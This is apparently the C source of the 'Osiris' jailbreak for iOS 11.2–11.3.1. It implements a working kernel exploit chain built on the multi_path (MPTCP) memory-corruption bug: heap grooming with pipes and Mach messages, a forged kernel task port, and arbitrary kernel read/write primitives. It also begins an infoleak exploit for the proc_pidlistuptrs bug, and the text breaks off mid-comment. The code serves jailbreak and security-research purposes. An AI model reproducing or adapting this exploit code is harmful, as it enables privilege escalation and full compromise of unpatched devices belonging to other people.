//
//  Osiris Jailbreak
//  iOS 11.2 - 11.3.1
//  Created by GeoSn0w on 5/10/18.
//  Big thanks to Ian Beer for multi_path exploit and Jonathan Levin for QiLin!
//
//
#include <sys/resource.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/proc.h>
#include <sys/ucred.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <pthread.h>
#include <mach/mach.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <copyfile.h>
#include <spawn.h>
#include "offsets.h"
#include "kmem.h"
#include "QiLin.h"

extern char **environ;
uint64_t evil;
uint64_t slide;
uint64_t kernproc = 0xfffffff0075dd0a0;
uint64_t rootvnode = 0xfffffff0075dd088;
uint64_t vfs_rootnode = 0xfffffff0071ff700;
uint64_t find_port_address(mach_port_t port, int disposition);

kern_return_t mach_vm_read(vm_map_t target_task,
                           mach_vm_address_t address,
                           mach_vm_size_t size,
                           vm_offset_t *data,
                           mach_msg_type_number_t *dataCnt);

kern_return_t mach_vm_write(vm_map_t target_task,
                            mach_vm_address_t address,
                            vm_offset_t data,
                            mach_msg_type_number_t dataCnt);

kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
                                     mach_vm_address_t address,
                                     mach_vm_size_t size,
                                     mach_vm_address_t data,
                                     mach_vm_size_t *outsize);
kern_return_t mach_vm_allocate(
                               vm_map_t target,
                               mach_vm_address_t *address,
                               mach_vm_size_t size,
                               int flags);


uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
    if (cached_task_self_addr == 0) {
        cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
        printf("task self: 0x%llx\n", cached_task_self_addr);
    }
    return cached_task_self_addr;
}

mach_port_t kmem_read_port = MACH_PORT_NULL;
void prepare_rk_via_kmem_read_port(mach_port_t port) {
    kmem_read_port = port;
}

mach_port_t tfp0 = MACH_PORT_NULL;
void prepare_rwk_via_tfp0(mach_port_t port) {
    tfp0 = port;
}
void prepare_for_rw_with_fake_tfp0(mach_port_t new_tfp0) {
    tfp0 = new_tfp0;
}

mach_port_t fake_host_priv_port = MACH_PORT_NULL;
uint64_t ipc_space_kernel() {
    return rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}
// build a fake host priv port
mach_port_t fake_host_priv() {
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
    uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
    
    // set the kobject
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    fake_host_priv_port = port;
    
    return port;
}

int have_kmem_read() {
    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);
}

int have_kmem_write() {
    return (tfp0 != MACH_PORT_NULL);
}

uint32_t rk32_via_kmem_read_port(uint64_t kaddr) {
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        printf("kmem_read_port not set, have you called prepare_rk?\n");
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        printf("error setting context off of dangling port: %x %s\n", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        printf("error calling pid_for_task %x %s", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }
    
    return val;
}

uint32_t rk32_via_tfp0(uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        //printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    return val;
}

void wkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp0,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)buffer,
                        (mach_msg_type_number_t)length);
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void rkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
    kern_return_t err;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)length,
                                 (mach_vm_address_t)buffer,
                                 &outsize);
    if (err != KERN_SUCCESS){
        //printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        return;
    }
    
    if (outsize != length){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return;
    }
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length) {
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        wkbuffer(dest, (void*) src, length);
    } else {
        // copy from kernel
        rkbuffer(src, (void*)dest, length);
    }
}

uint64_t kmem_alloc(uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

uint64_t kmem_alloc_wired(uint64_t size) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfp0, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    
    printf("allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("address to wire: %llx\n", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

void kmem_free(uint64_t kaddr, uint64_t size) {
    return;
    /*
     if (tfp0 == MACH_PORT_NULL) {
     printf("attempt to deallocate kernel memory before any kernel memory write primitives available\n");
     sleep(3);
     return;
     }
     
     kern_return_t err;
     mach_vm_size_t ksize = round_page_kernel(size);
     err = mach_vm_deallocate(tfp0, kaddr, ksize);
     if (err != KERN_SUCCESS) {
     printf("unable to deallocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
     sleep(3);
     return;
     }
     }
     
     void kmem_protect(uint64_t kaddr, uint32_t size, int prot) {
     if (tfp0 == MACH_PORT_NULL) {
     printf("attempt to change protection of kernel memory before any kernel memory write primitives available\n");
     sleep(3);
     return;
     }
     kern_return_t err;
     err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
     if (err != KERN_SUCCESS) {
     printf("unable to change protection of kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
     sleep(3);
     return;
     }
     */
}


void increase_limits() {
  struct rlimit lim = {0};
  int err = getrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to get limits\n");
  }
  printf("rlim.cur: %lld\n", lim.rlim_cur);
  printf("rlim.max: %lld\n", lim.rlim_max);
  lim.rlim_cur = 10240;
  err = setrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to set limits\n");
  }
  lim.rlim_cur = 0;
  lim.rlim_max = 0;
  err = getrlimit(RLIMIT_NOFILE, &lim);
  if (err != 0) {
    printf("failed to get limits\n");
  }
  printf("rlim.cur: %lld\n", lim.rlim_cur);
  printf("rlim.max: %lld\n", lim.rlim_max);
  
}

#define AF_MULTIPATH 39
int alloc_mptcp_socket() {
  int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
  if (sock < 0) {
    printf("socket failed\n");
    perror("");
    return -1;
  }
  return sock;
}

void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes) {
  struct sockaddr* sockaddr_src = malloc(256);
  memset(sockaddr_src, 'D', 256);
  *(uint64_t*) (((uint8_t*)sockaddr_src)+koffset(KFREE_ADDR_OFFSET)) = kaddr;
  sockaddr_src->sa_len = koffset(KFREE_ADDR_OFFSET)+n_bytes;
  sockaddr_src->sa_family = 'B';
  struct sockaddr* sockaddr_dst = malloc(256);
  memset(sockaddr_dst, 'C', 256);
  sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
  sockaddr_dst->sa_family = AF_INET6;
  sa_endpoints_t eps = {0};
  eps.sae_srcif = 0;
  eps.sae_srcaddr = sockaddr_src;
  eps.sae_srcaddrlen = koffset(KFREE_ADDR_OFFSET)+n_bytes;
  eps.sae_dstaddr = sockaddr_dst;
  eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
  printf("doing partial overwrite with target value: %016llx, length %d\n", kaddr, n_bytes);
  int err = connectx(
                     fd,
                     &eps,
                     SAE_ASSOCID_ANY,
                     0,
                     NULL,
                     0,
                     NULL,
                     NULL);
  printf("err: %d\n", err);
  close(fd);
  return;
}

char* aaaas = NULL;
int read_fds[10000] = {0};
int next_read_fd = 0;

#define PIPE_SIZE 0x7ff
int alloc_and_fill_pipe() {
  int fds[2] = {0};
  int err = pipe(fds);
  if (err != 0) {
    perror("pipe failed\n");
    return -1;
  }
  int read_end = fds[0];
  int write_end = fds[1];
  int flags = fcntl(write_end, F_GETFL);
  flags |= O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);
  if (aaaas == NULL) {
    aaaas = malloc(PIPE_SIZE);
    memset(aaaas, 'B', PIPE_SIZE);
  }
  ssize_t amount_written = write(write_end, aaaas, PIPE_SIZE);
  if (amount_written != PIPE_SIZE) {
    printf("amount written was short: 0x%ld\n", amount_written);
  }
  read_fds[next_read_fd++] = read_end;
  return read_end; // the buffer is actually hanging off the read end struct pipe
}

int find_replacer_pipe(void** contents) {
  uint64_t* read_back = malloc(PIPE_SIZE);
  for (int i = 0; i < next_read_fd; i++) {
    int fd = read_fds[i];
    ssize_t amount = read(fd, read_back, PIPE_SIZE);
    if (amount != PIPE_SIZE) {
      printf("short read (%ld)\n", amount);
    } else {
      printf("full read\n");
    }
    
    int pipe_is_replacer = 0;
    for (int j = 0; j < PIPE_SIZE/8; j++) {
      if (read_back[j] != 0x4242424242424242) {
        pipe_is_replacer = 1;
        printf("found an unexpected value: %016llx\n", read_back[j]);
      }
    }
    
    if (pipe_is_replacer) {
      *contents = read_back;
      return fd;
    }
  }
  return -1;
}

int message_size_for_kalloc_size(int kalloc_size) {
  return ((3*kalloc_size)/4) - 0x74;
}

mach_port_t fake_kalloc(int size) {
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("unable to allocate port\n");
  }
  struct simple_msg  {
    mach_msg_header_t hdr;
    char buf[0];
  };
  mach_msg_size_t msg_size = message_size_for_kalloc_size(size);
  struct simple_msg* msg = malloc(msg_size);
  memset(msg, 0, sizeof(struct simple_msg));
  memset(msg+1, 'E', msg_size - sizeof(struct simple_msg));
  msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
  msg->hdr.msgh_size = msg_size;
  msg->hdr.msgh_remote_port = port;
  msg->hdr.msgh_local_port = MACH_PORT_NULL;
  msg->hdr.msgh_id = 0x41414142;
  err = mach_msg(&msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  if (err != KERN_SUCCESS) {
    printf("early kalloc failed to send message\n");
  }
  return port;
}

void fake_kfree(mach_port_t port) {
  mach_port_destroy(mach_task_self(), port);
}

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver) {
  // clear the region we'll use:
  memset(fake_port, 0, 0x500);
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef;
  uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;
  uint8_t* fake_task = fake_port + 0x100;
  // set the ref_count field of the fake task:
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
  // make sure the task is active
  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
  // set the vm_map of the fake task:
  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
  // set the task lock type of the fake task's lock:
  *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}

/*
 * Things are easier and more stable if we can get the reallocated message buffer to be a pre-alloced one
 * as it won't be freed when we receive the message. This gives us one fewer places where we need to control
 * the reallocation of an object (a source of unreliability.)
 *
 * Ideally we'd like to use this ipc kmsg to also give us a useful kernel pointer to help us build the arbitrary
 * r/w. If we can get a send right to the host port in the kmsg we can use that as a building block to find the
 * kernel task port from which we can copy all the stuff we need to build a "fake" kernel task port.
 *
 * There aren't that many places where we can get the kernel to send a message containing a port we control.
 * One option is to use exception messages; we can actually get the kernel to use arbitrary ports as the task and thread ports.
 */

// size is desired kalloc size for message
mach_port_t prealloc_port(natural_t size) {
  kern_return_t err;
  mach_port_qos_t qos = {0};
  qos.prealloc = 1;
  qos.len = message_size_for_kalloc_size(size);
  
  mach_port_name_t name = MACH_PORT_NULL;
  
  err = mach_port_allocate_full(mach_task_self(),
                                MACH_PORT_RIGHT_RECEIVE,
                                MACH_PORT_NULL,
                                &qos,
                                &name);
  
  if (err != KERN_SUCCESS) {
    printf("pre-allocated port allocation failed: %s\n", mach_error_string(err));
    return MACH_PORT_NULL;
  }
  
  return (mach_port_t)name;
}

mach_port_t extracted_thread_port = MACH_PORT_NULL;

kern_return_t catch_exception_raise_state_identity
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
  printf("catch_exception_raise_state_identity\n");
  
  // the thread port isn't actually the thread port
  // we rewrote it via the pipe to be the fake kernel r/w port
  printf("thread: %x\n", thread);
  extracted_thread_port = thread;
  
  mach_port_deallocate(mach_task_self(), task);
  
  // make the thread exit cleanly when it resumes:
  memcpy(new_state, old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
  _STRUCT_ARM_THREAD_STATE64* new = (_STRUCT_ARM_THREAD_STATE64*)(new_state);
  
  *new_stateCnt = old_stateCnt;
  
  new->__pc = (uint64_t)pthread_exit;
  new->__x[0] = 0;
  
  // let the thread resume and exit
  return KERN_SUCCESS;
}

union max_msg {
  union __RequestUnion__exc_subsystem requests;
  union __ReplyUnion__exc_subsystem replies;
};

extern boolean_t exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);

void* do_thread(void* arg) {
  mach_port_t exception_port = (mach_port_t)arg;
  
  kern_return_t err;
  err = thread_set_exception_ports(
                                   mach_thread_self(),
                                   EXC_MASK_ALL,
                                   exception_port,
                                   EXCEPTION_STATE_IDENTITY, // catch_exception_raise_state_identity messages
                                   ARM_THREAD_STATE64);
  
  if (err != KERN_SUCCESS) {
    printf("failed to set exception port\n");
  }
  
  // make the thread port which gets sent in the message actually be the host port
  err = thread_set_special_port(mach_thread_self(), THREAD_KERNEL_PORT, mach_host_self());
  if (err != KERN_SUCCESS) {
    printf("failed to set THREAD_KERNEL_PORT\n");
  }
  
  // cause an exception message to be sent by the kernel
  volatile char* bAAAAd_ptr = (volatile char*)0x41414141;
  *bAAAAd_ptr = 'A';
  printf("no crashy?");
  return NULL;
}

void prepare_prealloc_port(mach_port_t port) {
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
  kern_return_t err;
  mach_port_seqno_t msg_seqno = 0;
  mach_msg_size_t msg_size = 0;
  mach_msg_id_t msg_id = 0;
  mach_msg_trailer_t msg_trailer; // NULL trailer
  mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
  err = mach_port_peek(mach_task_self(),
                       port,
                       MACH_RCV_TRAILER_NULL,
                       &msg_seqno,
                       &msg_size,
                       &msg_id,
                       (mach_msg_trailer_info_t)&msg_trailer,
                       &msg_trailer_size);
  
  return (err == KERN_SUCCESS);
}
// we need a send right for port
void send_prealloc_msg(mach_port_t port) {
  // start a new thread passing it the buffer and the exception port
  pthread_t t;
  pthread_create(&t, NULL, do_thread, (void*)port);
  
  // associate the pthread_t with the port so that we can join the correct pthread
  // when we receive the exception message and it exits:
  kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
  if (err != KERN_SUCCESS) {
    printf("failed to set context\n");
  }
  printf("set context\n");
  // wait until the message has actually been sent:
  while(!port_has_message(port)){;}
  printf("message was sent\n");
}
mach_port_t receive_prealloc_msg(mach_port_t port) {
kern_return_t err = mach_msg_server_once(exc_server,sizeof(union max_msg),port,MACH_MSG_TIMEOUT_NONE);
  
  printf("receive_prealloc_msg: %s\n", mach_error_string(err));
  
  // get the pthread context back from the port and join it:
  pthread_t t;
  err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);
  pthread_join(t, NULL);
  
  return extracted_thread_port;
}
uint64_t early_read_pipe_buffer_kaddr;
int early_read_pipe_read_end;
int early_read_pipe_write_end;
mach_port_t early_read_port;
mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr, int pipe_read_end, int pipe_write_end, mach_port_t replacer_port, uint8_t* original_contents) {
  early_read_pipe_buffer_kaddr = pipe_buffer_kaddr;
  early_read_pipe_read_end = pipe_read_end;
  early_read_pipe_write_end = pipe_write_end;
  early_read_port = replacer_port;
  
  // we have free space in the ipc_kmsg from +58h to +648
  
  // lets build an initial kernel read port in there
  // like in async_wake, extra_recipe and yalu
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  
  build_fake_task_port(original_contents+fake_port_offset, fake_port_kaddr, early_read_pipe_buffer_kaddr, 0, 0);
  
  // the thread port is at +66ch
  // we could parse the kmsg properly, but this'll do...
  // replace the thread port pointer with one to our fake port:
  *((uint64_t*)(original_contents+0x66c)) = fake_port_kaddr;
  
  // replace the ipc_kmsg:
  write(pipe_write_end, original_contents, PIPE_SIZE);
  early_read_port = receive_prealloc_msg(replacer_port);
  return early_read_port;
}

uint32_t early_rk32(uint64_t kaddr) {
  uint8_t* pipe_contents = malloc(PIPE_SIZE);
  ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
  if (amount != PIPE_SIZE) {
    printf("early_rk32 pipe buffer read was short\n");
  }
  
  // no need to actually build it again, but this read function will only be used a handful of times during bootstrap
  
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  
  build_fake_task_port(pipe_contents+fake_port_offset, fake_port_kaddr, kaddr, 0, 0);
  
  // replace the ipc_kmsg:
  write(early_read_pipe_write_end, pipe_contents, PIPE_SIZE);
  
  uint32_t val = 0;
  kern_return_t err = pid_for_task(early_read_port, (int*)&val);
  if (err != KERN_SUCCESS) {
    printf("pid_for_task returned %x\n", err);
  }
  printf("read val via pid_for_task: %08x\n", val);
  free(pipe_contents);
  return val;
}

uint64_t early_rk64(uint64_t kaddr) {
  uint64_t lower = (uint64_t)early_rk32(kaddr);
  uint64_t upper = (uint64_t)early_rk32(kaddr + 4);
  uint64_t final = lower | (upper << 32);
  return final;
}

// yes, this isn't the real kernel task port
// but you can modify the exploit easily to give you that if you want it!
mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver) {
  uint8_t* pipe_contents = malloc(PIPE_SIZE);
  ssize_t amount = read(early_read_pipe_read_end, pipe_contents, PIPE_SIZE);
  if (amount != PIPE_SIZE) {
    printf("prepare_tfp0 pipe buffer read was short\n");
  }
  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;
  build_fake_task_port(pipe_contents+fake_port_offset, fake_port_kaddr, 0x4848484848484848, vm_map, receiver);
  // replace the ipc_kmsg:
  write(early_read_pipe_write_end, pipe_contents, PIPE_SIZE);
  free(pipe_contents);
  // early_read_port is no longer only capable of reads!
  return early_read_port;
}

void wk32(uint64_t kaddr, uint32_t val) {
  if (tfp0 == MACH_PORT_NULL) {
    printf("[i] attempt to write to kernel memory before any kernel memory write primitives available\n");
    sleep(3);
    return;
  }
  
  kern_return_t err;
  err = mach_vm_write(tfp0,
                      (mach_vm_address_t)kaddr,
                      (vm_offset_t)&val,
                      (mach_msg_type_number_t)sizeof(uint32_t));
  
  if (err != KERN_SUCCESS) {
    printf("[!] tfp0 write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

void wk64(uint64_t kaddr, uint64_t val) {
  uint32_t lower = (uint32_t)(val & 0xffffffff);
  uint32_t higher = (uint32_t)(val >> 32);
  wk32(kaddr, lower);
  wk32(kaddr+4, higher);
}

uint32_t rk32(uint64_t kaddr) {
  kern_return_t err;
  uint32_t val = 0;
  mach_vm_size_t outsize = 0;
  err = mach_vm_read_overwrite(tfp0,
                               (mach_vm_address_t)kaddr,
                               (mach_vm_size_t)sizeof(uint32_t),
                               (mach_vm_address_t)&val,
                               &outsize);
  if (err != KERN_SUCCESS){
    printf("[!] tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
    sleep(3);
    return 0;
  }
  
  if (outsize != sizeof(uint32_t)){
    printf("[!] tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
    sleep(3);
    return 0;
  }
  return val;
}

uint64_t rk64(uint64_t kaddr) {
  uint64_t lower = rk32(kaddr);
  uint64_t higher = rk32(kaddr+4);
  uint64_t full = ((higher<<32) | lower);
  return full;
}

uint64_t proc_for_pid(uint32_t pid) {
    uint64_t task_self;
    task_for_pid(mach_task_self(), getpid(), &task_self);
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t fpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (fpid == pid) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1;
}

/*uint64_t dump_kernel()
{
    uint64_t search_addr = evil;
    search_addr &= 0xfffffffffffff000;
    //search_addr = rk64(search_addr-0x88);
    printf("begin search for 0x0100000cfeedfacf kernel magic at 0x%16lx\n",search_addr);
    uint64_t indata;
    while (1)
    {
        indata = rk64(search_addr);
        printf("0x%16lx: [0x%16lx]\n", search_addr, indata);
        if (indata == 0x0100000cfeedfacf)
        {
            printf("[+]\tfound 0x0100000cfeedfacf magic kernel0x%llx\n", search_addr);
            return search_addr;
        } else {
            search_addr-=0x8;
        }
    }
}*/


/*
 * this is an exploit for the proc_pidlistuptrs bug (P0 issue 1372)
 *
 * It will reliably determine the kernel address of a mach port.
 * Knowing the addresses of ports makes the other UaF exploit much simpler.
 */

// missing headers
#define KEVENT_FLAG_WORKLOOP 0x400

typedef uint64_t kqueue_id_t;

struct kevent_qos_s {
    uint64_t        ident;          /* identifier for this event */
    int16_t         filter;         /* filter for event */
    uint16_t        flags;          /* general flags */
    uint32_t        qos;            /* quality of service when servicing event */
    uint64_t        udata;          /* opaque user data identifier */
    uint32_t        fflags;         /* filter-specific flags */
    uint32_t        xflags;         /* extra filter-specific flags */
    int64_t         data;           /* filter-specific data */
    uint64_t        ext[4];         /* filter-specific extensions */
};

#define PRIVATE
#include <sys/types.h>
#include <sys/event.h>
#include <sys/time.h>
#include <sys/event.h>

struct kevent_extinfo {
    struct kevent_qos_s kqext_kev;
    uint64_t kqext_sdata;
    int kqext_status;
    int kqext_sfflags;
    uint64_t kqext_reserved[2];
};

extern int kevent_id(uint64_t id, const struct kevent_qos_s *changelist, int nchanges, struct kevent_qos_s *eventlist, int nevents, void *data_out, size_t *data_available, unsigned int flags);

int proc_list_uptrs(pid_t pid, uint64_t *buffer, uint32_t buffersize);

// appends n_events user events onto this process's kevent queue
static void fill_events(int n_events) {
    struct kevent_qos_s events_id[] = {{
        .filter = EVFILT_USER,
        .ident = 1,
        .flags = EV_ADD,
        .udata = 0x2345
    }};
    
    kqueue_id_t id = 0x1234;
    
    for (int i = 0; i < n_events; i++) {
        int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,
                            KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
        
        if (err != 0) {
            printf(" [-] failed to enqueue user event\n");
            exit(EXIT_FAILURE);
        }
        
        events_id[0].ident++;
    }
}

int kqueues_allocated = 0;

static void prepare_kqueue() {
    // ensure there are a large number of events so that kevent_proc_copy_uptrs
    // always returns a large number
    if (kqueues_allocated) {
        return;
    }
    fill_events(10000);
    printf(" [+] prepared kqueue\n");
    kqueues_allocated = 1;
}

// will make a kalloc allocation of (count*8)+7
// and only write to the first (count*8) bytes.
// the return value is those last 7 bytes uninitialized bytes as a uint64_t
// (the upper byte will be set to 0)
static uint64_t try_leak(int count) {
    int buf_size = (count*8)+7;
    char* buf = calloc(buf_size+1, 1);
    
    int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);
    
    if (err == -1) {
        return 0;
    }
    
    // the last 7 bytes will contain the leaked data:
    uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc
    
    return last_val;
}

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

// fills a kalloc allocation with count times of target_port's struct ipc_port pointer
// To cause the kalloc allocation to be free'd mach_port_destroy the returned receive right
